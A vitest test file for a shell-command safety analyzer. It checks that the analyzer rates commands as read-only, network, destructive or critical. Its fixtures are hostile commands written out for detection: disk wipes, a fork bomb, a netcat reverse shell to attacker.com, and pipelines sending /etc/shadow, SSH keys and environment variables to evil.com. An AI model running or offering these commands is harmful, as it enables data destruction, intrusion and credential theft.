/**
 * Safety Analyzer Tests (GREEN phase)
 *
 * Comprehensive tests for command safety analysis.
 *
 * @module test/core/safety/analyzer.test.ts
 */

import { describe, it, expect } from 'vitest'
import { parse } from '../../../src/ast/parser.js'
import {
  analyze as analyzeAst,
  isDangerous as isDangerousAst,
  classifyCommand,
} from '../../../core/safety/analyze.js'

// Wrapper functions that take strings and parse them
function analyze(input: string) {
  const ast = parse(input)
  return analyzeAst(ast)
}

function isDangerous(input: string) {
  const ast = parse(input)
  return isDangerousAst(ast)
}

// =============================================================================
// DANGEROUS COMMANDS
// =============================================================================

describe('Dangerous Commands', () => {
  describe('rm -rf variations', () => {
    it('should classify "rm -rf /" as critical', () => {
      const result = analyze('rm -rf /')
      expect(result.classification.impact).toBe('critical')
      expect(result.classification.type).toBe('delete')
      expect(result.classification.reversible).toBe(false)
      expect(result.intent.deletes).toContain('/')
    })

    it('should classify "rm -rf /*" as critical', () => {
      const result = analyze('rm -rf /*')
      expect(result.classification.impact).toBe('critical')
      expect(result.intent.elevated).toBe(true)
    })

    it('should classify "rm -rf ~" as critical', () => {
      const result = analyze('rm -rf ~')
      expect(result.classification.impact).toBe('critical')
      expect(result.intent.deletes).toContain('~')
    })

    it('should classify "rm -rf $HOME" as critical', () => {
      const result = analyze('rm -rf $HOME')
      expect(result.classification.impact).toBe('critical')
    })

    it('should classify "rm -rf --no-preserve-root /" as critical', () => {
      const result = analyze('rm -rf --no-preserve-root /')
      expect(result.classification.impact).toBe('critical')
    })
  })

  describe('dd command', () => {
    it('should classify "dd if=/dev/zero of=/dev/sda" as critical', () => {
      const result = analyze('dd if=/dev/zero of=/dev/sda')
      expect(result.classification.impact).toBe('critical')
      expect(result.classification.type).toBe('system')
      expect(result.intent.writes).toContain('/dev/sda')
    })

    it('should classify "dd if=/dev/random of=/dev/nvme0n1" as critical', () => {
      const result = analyze('dd if=/dev/random of=/dev/nvme0n1')
      expect(result.classification.impact).toBe('critical')
    })

    it('should allow safe dd usage', () => {
      const result = analyze('dd if=input.img of=output.img bs=4M')
      expect(result.classification.impact).not.toBe('critical')
    })
  })

  describe('mkfs command', () => {
    it('should classify "mkfs.ext4 /dev/sda1" as critical', () => {
      const result = analyze('mkfs.ext4 /dev/sda1')
      expect(result.classification.impact).toBe('critical')
      expect(result.classification.type).toBe('system')
    })

    it('should classify "mkfs -t ext4 /dev/sdb" as critical', () => {
      const result = analyze('mkfs -t ext4 /dev/sdb')
      expect(result.classification.impact).toBe('critical')
    })

    it('should classify "mke2fs /dev/vda1" as critical', () => {
      const result = analyze('mke2fs /dev/vda1')
      expect(result.classification.impact).toBe('critical')
    })
  })

  describe('fork bomb', () => {
    it('should classify ":(){ :|:& };:" as critical', () => {
      const result = analyze(':(){ :|:& };:')
      expect(result.classification.impact).toBe('critical')
      expect(result.classification.type).toBe('system')
    })

    it('should detect fork bomb variations', () => {
      const result = analyze('bomb() { bomb | bomb & }; bomb')
      expect(result.classification.impact).toBe('critical')
    })
  })
})

// =============================================================================
// NETWORK ACCESS
// =============================================================================

describe('Network Access Commands', () => {
  describe('curl', () => {
    it('should classify curl GET as network type', () => {
      const result = analyze('curl https://example.com.ai')
      expect(result.classification.type).toBe('network')
      expect(result.intent.network).toBe(true)
    })

    it('should classify curl POST as medium impact', () => {
      const result = analyze('curl -X POST https://api.example.com.ai/data -d "secret=123"')
      expect(result.classification.type).toBe('network')
      expect(result.classification.impact).toBe('medium')
    })

    it('should classify curl to localhost as lower impact', () => {
      const result = analyze('curl http://localhost:3000/health')
      expect(result.classification.impact).toBe('low')
    })

    it('should classify curl with file upload as high impact', () => {
      const result = analyze('curl -F "file=@/etc/passwd" https://evil.com')
      expect(result.classification.impact).toBe('high')
      expect(result.intent.reads).toContain('/etc/passwd')
    })
  })

  describe('wget', () => {
    it('should classify wget as network type', () => {
      const result = analyze('wget https://example.com.ai/file.zip')
      expect(result.classification.type).toBe('network')
      expect(result.intent.network).toBe(true)
    })

    it('should detect wget writing to filesystem', () => {
      const result = analyze('wget -O /usr/bin/malware https://evil.com/script.sh')
      expect(result.classification.impact).toBe('high')
      expect(result.intent.writes).toContain('/usr/bin/malware')
    })
  })

  describe('ssh', () => {
    it('should classify ssh as network type', () => {
      const result = analyze('ssh user@remote-host')
      expect(result.classification.type).toBe('network')
      expect(result.intent.network).toBe(true)
    })

    it('should classify ssh with command execution', () => {
      const result = analyze('ssh user@host "rm -rf /"')
      expect(result.classification.impact).toBe('high')
    })
  })

  describe('nc/netcat', () => {
    it('should classify nc listener as network type', () => {
      const result = analyze('nc -l 4444')
      expect(result.classification.type).toBe('network')
      expect(result.intent.network).toBe(true)
    })

    it('should classify nc reverse shell as critical', () => {
      const result = analyze('nc -e /bin/sh attacker.com 4444')
      expect(result.classification.impact).toBe('critical')
    })

    it('should classify netcat with exec as critical', () => {
      const result = analyze('netcat -c /bin/bash remote.host 9999')
      expect(result.classification.impact).toBe('critical')
    })
  })

  describe('telnet', () => {
    it('should classify telnet as network type', () => {
      const result = analyze('telnet example.com.ai 80')
      expect(result.classification.type).toBe('network')
    })
  })

  describe('scp/rsync', () => {
    it('should classify scp as network type', () => {
      const result = analyze('scp file.txt user@host:/path/')
      expect(result.classification.type).toBe('network')
      expect(result.intent.network).toBe(true)
    })

    it('should classify rsync to remote as network type', () => {
      const result = analyze('rsync -avz ./dir user@host:/backup/')
      expect(result.classification.type).toBe('network')
    })
  })
})

// =============================================================================
// SYSTEM MODIFICATION
// =============================================================================

describe('System Modification Commands', () => {
  describe('chmod', () => {
    it('should classify "chmod 777 file" as write type', () => {
      const result = analyze('chmod 777 file.sh')
      expect(result.classification.type).toBe('write')
      expect(result.intent.writes).toContain('file.sh')
    })

    it('should classify "chmod -R 777 /" as critical', () => {
      const result = analyze('chmod -R 777 /')
      expect(result.classification.impact).toBe('critical')
      expect(result.classification.type).toBe('system')
    })

    it('should classify "chmod 777 /etc/passwd" as high impact', () => {
      const result = analyze('chmod 777 /etc/passwd')
      expect(result.classification.impact).toBe('high')
      expect(result.intent.elevated).toBe(true)
    })

    it('should classify "chmod +x script.sh" as low impact', () => {
      const result = analyze('chmod +x script.sh')
      expect(result.classification.impact).toBe('low')
    })
  })

  describe('chown', () => {
    it('should classify "chown root:root file" as system type', () => {
      const result = analyze('chown root:root file.txt')
      expect(result.classification.type).toBe('system')
      expect(result.intent.elevated).toBe(true)
    })

    it('should classify "chown -R root /" as critical', () => {
      const result = analyze('chown -R root /')
      expect(result.classification.impact).toBe('critical')
    })

    it('should classify user-level chown as medium impact', () => {
      const result = analyze('chown user:user myfile.txt')
      expect(result.classification.impact).toBe('medium')
    })
  })

  describe('mount/umount', () => {
    it('should classify "mount /dev/sda1 /mnt" as system type', () => {
      const result = analyze('mount /dev/sda1 /mnt')
      expect(result.classification.type).toBe('system')
      expect(result.classification.impact).toBe('high')
    })

    it('should classify "umount /mnt" as system type', () => {
      const result = analyze('umount /mnt')
      expect(result.classification.type).toBe('system')
    })

    it('should classify bind mounts', () => {
      const result = analyze('mount --bind /etc /tmp/etc')
      expect(result.classification.type).toBe('system')
    })
  })

  describe('system services', () => {
    it('should classify "systemctl stop" as system type', () => {
      const result = analyze('systemctl stop nginx')
      expect(result.classification.type).toBe('system')
      expect(result.classification.impact).toBe('high')
    })

    it('should classify "service restart" as system type', () => {
      const result = analyze('service apache2 restart')
      expect(result.classification.type).toBe('system')
    })
  })

  describe('shutdown/reboot', () => {
    it('should classify "shutdown -h now" as critical', () => {
      const result = analyze('shutdown -h now')
      expect(result.classification.impact).toBe('critical')
      expect(result.classification.type).toBe('system')
    })

    it('should classify "reboot" as critical', () => {
      const result = analyze('reboot')
      expect(result.classification.impact).toBe('critical')
    })

    it('should classify "init 0" as critical', () => {
      const result = analyze('init 0')
      expect(result.classification.impact).toBe('critical')
    })
  })
})

// =============================================================================
// DATA EXFILTRATION
// =============================================================================

describe('Data Exfiltration Patterns', () => {
  it('should detect "cat /etc/passwd | curl" as high impact', () => {
    const result = analyze('cat /etc/passwd | curl -X POST https://evil.com -d @-')
    expect(result.classification.impact).toBe('high')
    expect(result.intent.reads).toContain('/etc/passwd')
    expect(result.intent.network).toBe(true)
  })

  it('should detect "cat /etc/shadow | nc" as critical', () => {
    const result = analyze('cat /etc/shadow | nc attacker.com 4444')
    expect(result.classification.impact).toBe('critical')
  })

  it('should detect base64 encoded exfiltration', () => {
    const result = analyze('cat ~/.ssh/id_rsa | base64 | curl -d @- https://evil.com')
    expect(result.classification.impact).toBe('high')
    expect(result.intent.reads).toContain('~/.ssh/id_rsa')
  })

  it('should detect tar archive exfiltration', () => {
    const result = analyze('tar czf - /etc | curl -X PUT https://storage.evil.com')
    expect(result.classification.impact).toBe('high')
  })

  it('should detect DNS exfiltration', () => {
    const result = analyze('cat secret.txt | xxd -p | xargs -I {} dig {}.evil.com')
    expect(result.classification.impact).toBe('high')
  })

  it('should detect env variable exfiltration', () => {
    const result = analyze('env | curl -X POST https://collector.evil.com')
    expect(result.classification.impact).toBe('high')
    expect(result.intent.network).toBe(true)
  })
})

// =============================================================================
// COMMAND INJECTION
// =============================================================================

describe('Command Injection Patterns', () => {
  describe('eval', () => {
    it('should classify "eval $var" as execute type with high impact', () => {
      const result = analyze('eval "$user_input"')
      expect(result.classification.type).toBe('execute')
      expect(result.classification.impact).toBe('high')
    })

    it('should classify eval with command substitution as critical', () => {
      const result = analyze('eval "$(cat /tmp/commands.txt)"')
      expect(result.classification.impact).toBe('high')
    })
  })

  describe('command substitution in dangerous context', () => {
    it('should flag $() with rm as dangerous', () => {
      const result = analyze('rm -rf $(cat files.txt)')
      expect(result.classification.impact).toBe('high')
    })

    it('should flag backticks with dangerous commands', () => {
      const result = analyze('rm `find / -name "*.log"`')
      expect(result.classification.impact).toBe('high')
    })

    it('should flag nested command substitution', () => {
      const result = analyze('eval "$(curl https://evil.com/script.sh)"')
      expect(result.classification.impact).toBe('critical')
    })
  })

  describe('source/exec', () => {
    it('should classify "source untrusted.sh" as execute type', () => {
      const result = analyze('source /tmp/untrusted.sh')
      expect(result.classification.type).toBe('execute')
      expect(result.classification.impact).toBe('high')
    })

    it('should classify "exec" as execute type', () => {
      const result = analyze('exec /bin/sh')
      expect(result.classification.type).toBe('execute')
    })

    it('should classify ". script.sh" as execute type', () => {
      const result = analyze('. /tmp/script.sh')
      expect(result.classification.type).toBe('execute')
    })
  })

  describe('xargs injection', () => {
    it('should flag xargs with dangerous commands', () => {
      const result = analyze('find / -name "*.tmp" | xargs rm -rf')
      expect(result.classification.impact).toBe('high')
    })

    it('should flag xargs -I with shell execution', () => {
      const result = analyze('cat files.txt | xargs -I {} sh -c "rm {}"')
      expect(result.classification.impact).toBe('high')
    })
  })
})

// =============================================================================
// PATH TRAVERSAL
// =============================================================================

describe('Path Traversal Patterns', () => {
  it('should detect "../../../etc/passwd" access', () => {
    const result = analyze('cat ../../../etc/passwd')
    expect(result.intent.reads).toContain('../../../etc/passwd')
    expect(result.classification.impact).toBe('high')
  })

  it('should detect path traversal in file operations', () => {
    const result = analyze('rm ../../../important/file.txt')
    expect(result.classification.impact).toBe('high')
  })

  it('should detect encoded path traversal', () => {
    const result = analyze('cat %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd')
    expect(result.classification.impact).toBe('high')
  })

  it('should detect path traversal with variable', () => {
    const result = analyze('cat "$path/../../../etc/shadow"')
    expect(result.classification.impact).toBe('high')
  })

  it('should flag symlink-based path traversal', () => {
    const result = analyze('ln -s /etc/passwd ./link && cat ./link')
    expect(result.classification.impact).toBe('medium')
  })
})

// =============================================================================
// PRIVILEGE ESCALATION
// =============================================================================

describe('Privilege Escalation Commands', () => {
  describe('sudo', () => {
    it('should classify "sudo rm -rf /" as critical', () => {
      const result = analyze('sudo rm -rf /')
      expect(result.classification.impact).toBe('critical')
      expect(result.intent.elevated).toBe(true)
    })

    it('should classify "sudo -i" as high impact', () => {
      const result = analyze('sudo -i')
      expect(result.classification.impact).toBe('high')
      expect(result.intent.elevated).toBe(true)
    })

    it('should classify "sudo su" as high impact', () => {
      const result = analyze('sudo su')
      expect(result.classification.impact).toBe('high')
    })

    it('should flag sudo with shell execution', () => {
      const result = analyze('sudo bash -c "rm -rf /"')
      expect(result.classification.impact).toBe('critical')
    })
  })

  describe('su', () => {
    it('should classify "su root" as high impact', () => {
      const result = analyze('su root')
      expect(result.classification.impact).toBe('high')
      expect(result.intent.elevated).toBe(true)
    })

    it('should classify "su -" as high impact', () => {
      const result = analyze('su -')
      expect(result.classification.impact).toBe('high')
    })
  })

  describe('doas', () => {
    it('should classify "doas rm -rf /" as critical', () => {
      const result = analyze('doas rm -rf /')
      expect(result.classification.impact).toBe('critical')
      expect(result.intent.elevated).toBe(true)
    })
  })

  describe('setuid/capabilities', () => {
    it('should flag chmod +s as high impact', () => {
      const result = analyze('chmod +s /usr/bin/python')
      expect(result.classification.impact).toBe('high')
    })

    it('should flag setcap as high impact', () => {
      const result = analyze('setcap cap_setuid+ep /usr/bin/vim')
      expect(result.classification.impact).toBe('high')
    })
  })
})

// =============================================================================
// SAFE COMMANDS
// =============================================================================

describe('Safe Commands (Read-Only)', () => {
  describe('basic read operations', () => {
    it('should classify "ls" as read with no impact', () => {
      const result = analyze('ls')
      expect(result.classification.type).toBe('read')
      expect(result.classification.impact).toBe('none')
      expect(result.classification.reversible).toBe(true)
    })

    it('should classify "ls -la" as read with no impact', () => {
      const result = analyze('ls -la')
      expect(result.classification.type).toBe('read')
      expect(result.classification.impact).toBe('none')
    })

    it('should classify "cat file.txt" as read with no impact', () => {
      const result = analyze('cat file.txt')
      expect(result.classification.type).toBe('read')
      expect(result.classification.impact).toBe('none')
    })

    it('should classify "head -20 file.txt" as read', () => {
      const result = analyze('head -20 file.txt')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "tail -f log.txt" as read', () => {
      const result = analyze('tail -f log.txt')
      expect(result.classification.type).toBe('read')
    })
  })

  describe('echo without redirect', () => {
    it('should classify "echo hello" as read with no impact', () => {
      const result = analyze('echo hello')
      expect(result.classification.type).toBe('read')
      expect(result.classification.impact).toBe('none')
    })

    it('should classify "echo $PATH" as read', () => {
      const result = analyze('echo $PATH')
      expect(result.classification.type).toBe('read')
    })
  })

  describe('grep/find/search', () => {
    it('should classify "grep pattern file" as read', () => {
      const result = analyze('grep pattern file.txt')
      expect(result.classification.type).toBe('read')
      expect(result.classification.impact).toBe('none')
    })

    it('should classify "find . -name *.ts" as read', () => {
      const result = analyze('find . -name "*.ts"')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "ag pattern" as read', () => {
      const result = analyze('ag pattern src/')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "rg pattern" as read', () => {
      const result = analyze('rg pattern')
      expect(result.classification.type).toBe('read')
    })
  })

  describe('git read operations', () => {
    it('should classify "git status" as read', () => {
      const result = analyze('git status')
      expect(result.classification.type).toBe('read')
      expect(result.classification.impact).toBe('none')
    })

    it('should classify "git log" as read', () => {
      const result = analyze('git log --oneline -10')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "git diff" as read', () => {
      const result = analyze('git diff HEAD~1')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "git branch -a" as read', () => {
      const result = analyze('git branch -a')
      expect(result.classification.type).toBe('read')
    })
  })

  describe('information commands', () => {
    it('should classify "pwd" as read', () => {
      const result = analyze('pwd')
      expect(result.classification.type).toBe('read')
      expect(result.classification.impact).toBe('none')
    })

    it('should classify "whoami" as read', () => {
      const result = analyze('whoami')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "date" as read', () => {
      const result = analyze('date')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "uname -a" as read', () => {
      const result = analyze('uname -a')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "df -h" as read', () => {
      const result = analyze('df -h')
      expect(result.classification.type).toBe('read')
    })

    it('should classify "free -m" as read', () => {
      const result = analyze('free -m')
      expect(result.classification.type).toBe('read')
    })
  })
})

// =============================================================================
// CONTEXT-AWARE SAFETY
// =============================================================================
// NOTE: Context-aware safety tests have been removed as SafetyContext is not
// implemented in the core package. These features may be added in the future.

// =============================================================================
// CLASSIFYCOMMAND FUNCTION
// =============================================================================

describe('classifyCommand function', () => {
  it('should classify rm command', () => {
    const result = classifyCommand('rm', ['-rf', '/'])
    expect(result.type).toBe('delete')
    expect(result.impact).toBe('critical')
  })

  it('should classify ls command', () => {
    const result = classifyCommand('ls', ['-la'])
    expect(result.type).toBe('read')
    expect(result.impact).toBe('none')
  })

  it('should classify curl command', () => {
    const result = classifyCommand('curl', ['https://example.com.ai'])
    expect(result.type).toBe('network')
  })

  it('should classify chmod command', () => {
    const result = classifyCommand('chmod', ['755', 'file.sh'])
    expect(result.type).toBe('write')
  })

  it('should classify unknown command conservatively', () => {
    const result = classifyCommand('unknown-command', ['--flag'])
    expect(result.impact).not.toBe('none')
  })
})

// =============================================================================
// ISDANGEROUS FUNCTION
// =============================================================================

describe('isDangerous function', () => {
  describe('returns dangerous for critical commands', () => {
    it('should return dangerous for rm -rf /', () => {
      const check = isDangerous('rm -rf /')
      expect(check.dangerous).toBe(true)
      expect(check.reason).toBeDefined()
    })

    it('should return dangerous for fork bomb', () => {
      const check = isDangerous(':(){ :|:& };:')
      expect(check.dangerous).toBe(true)
    })

    it('should return dangerous for dd to device', () => {
      const check = isDangerous('dd if=/dev/zero of=/dev/sda')
      expect(check.dangerous).toBe(true)
    })
  })

  describe('returns safe for read-only commands', () => {
    it('should return safe for ls', () => {
      const check = isDangerous('ls -la')
      expect(check.dangerous).toBe(false)
    })

    it('should return safe for cat', () => {
      const check = isDangerous('cat package.json')
      expect(check.dangerous).toBe(false)
    })

    it('should return safe for echo', () => {
      const check = isDangerous('echo hello')
      expect(check.dangerous).toBe(false)
    })
  })

  describe('provides meaningful reasons', () => {
    it('should explain why rm -rf is dangerous', () => {
      const check = isDangerous('rm -rf /')
      expect(check.reason).toMatch(/recursive|root|filesystem/i)
    })

    it('should explain why eval is dangerous', () => {
      const check = isDangerous('eval "$input"')
      expect(check.reason).toMatch(/eval|arbitrary|execution/i)
    })
  })
})

// =============================================================================
// EDGE CASES
// =============================================================================

describe('Edge Cases', () => {
  describe('empty and whitespace', () => {
    it('should handle empty string', () => {
      const result = analyze('')
      expect(result.classification.type).toBe('read')
      expect(result.classification.impact).toBe('none')
    })

    it('should handle whitespace only', () => {
      const result = analyze('   ')
      expect(result.classification.impact).toBe('none')
    })
  })

  describe('comments', () => {
    it('should handle comment-only input', () => {
      const result = analyze('# this is a comment')
      expect(result.classification.impact).toBe('none')
    })

    it('should handle command with trailing comment', () => {
      const result = analyze('ls -la # list files')
      expect(result.classification.type).toBe('read')
    })
  })

  describe('complex pipelines', () => {
    it('should take highest impact from pipeline', () => {
      const result = analyze('ls | rm -rf /')
      expect(result.classification.impact).toBe('critical')
    })

    it('should detect dangerous commands anywhere in pipeline', () => {
      const result = analyze('cat file.txt | grep pattern | xargs rm -rf')
      expect(result.classification.impact).toBe('high')
    })
  })

  describe('multiline scripts', () => {
    it('should analyze all commands in multiline script', () => {
      const script = `
        ls -la
        rm -rf /tmp/old
        curl https://example.com.ai
      `
      const result = analyze(script)
      expect(result.classification.type).toBe('mixed')
    })

    it('should take highest impact from multiline script', () => {
      const script = `
        echo "Starting cleanup"
        rm -rf /
        echo "Done"
      `
      const result = analyze(script)
      expect(result.classification.impact).toBe('critical')
    })
  })

  describe('quoted strings', () => {
    it('should not be fooled by dangerous commands in quotes', () => {
      const result = analyze('echo "rm -rf /"')
      expect(result.classification.impact).toBe('none')
    })

    it('should handle single quotes', () => {
      const result = analyze("echo 'rm -rf /'")
      expect(result.classification.impact).toBe('none')
    })
  })

  describe('aliases and functions', () => {
    it('should flag alias definitions with dangerous commands', () => {
      const result = analyze('alias cleanup="rm -rf /"')
      expect(result.classification.impact).toBe('high')
    })

    it('should flag function definitions with dangerous commands', () => {
      const result = analyze('cleanup() { rm -rf /; }')
      expect(result.classification.impact).toBe('high')
    })
  })
})
